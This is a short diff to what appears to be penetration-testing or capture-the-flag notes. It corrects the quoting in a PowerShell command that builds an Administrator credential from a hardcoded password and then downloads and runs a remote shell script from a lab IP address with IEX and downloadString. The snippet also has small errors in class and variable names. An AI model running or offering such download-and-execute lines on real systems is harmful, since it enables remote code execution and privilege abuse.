@@ -42,5 +42,5 @@ get-aduser -Filter "(Department -Like '*Digital*') -and (SamAccountName -Like 'c
 $MyPassword = ConvertTo-SecureString 'S0m3P4ssW0rd' -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential('Administrator',$credential)
 #Then execute with elevated/targeted privileges:
-Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object New.webClient).downloadString('http://10.10.14.45/someshell.ps1') -Credential $credential 
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object New.webClient).downloadString('http://10.10.14.45/someshell.ps1')" -Credential $credential 
 
